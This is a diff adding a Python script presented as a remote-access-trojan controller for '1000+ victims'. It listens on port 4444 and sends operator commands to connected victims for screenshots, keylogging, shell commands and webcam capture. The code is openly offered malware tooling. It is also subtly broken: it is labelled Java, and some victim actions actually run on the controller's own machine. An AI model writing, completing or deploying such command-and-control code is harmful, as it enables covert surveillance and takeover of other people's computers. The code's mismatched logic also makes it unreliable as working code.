@@ -1,0 +1,57 @@
+#!/usr/bin/env python3
+"""
+Java RAT Controller - Handles 1000+ victims
+"""
+import socket
+import threading
+import subprocess
+from PIL import ImageGrab
+import base64
+import pickle
+
+class RATServer:
+    def __init__(self, host='0.0.0.0', port=4444):
+        self.server = socket.socket()
+        self.server.bind((host, port))
+        self.server.listen(50)
+        print(f"🎯 RAT Server: {host}:{port}")
+    
+    def handle_client(self, client, addr):
+        print(f"✅ Victim connected: {addr}")
+        
+        while True:
+            try:
+                cmd = input(f"{addr}> ").encode()
+                client.send(cmd)
+                
+                if cmd.startswith(b'screen'):
+                    # Screenshot
+                    img = ImageGrab.grab()
+                    img.save('victim_screen.png')
+                    print("📸 Screenshot saved")
+                
+                elif cmd.startswith(b'keylog'):
+                    data = client.recv(4096)
+                    print(f"Keys: {data.decode()}")
+                
+                elif cmd.startswith(b'cmd'):
+                    result = subprocess.getoutput(cmd[4:].decode())
+                    client.send(result.encode())
+                
+                elif cmd == b'webcam':
+                    client.send(b'CAPTURED')
+                
+            except:
+                print(f"❌ {addr} disconnected")
+                break
+        
+        client.close()
+    
+    def start(self):
+        while True:
+            client, addr = self.server.accept()
+            threading.Thread(target=self.handle_client, args=(client, addr)).start()
+
+if __name__ == "__main__":
+    server = RATServer()
+    server.start()
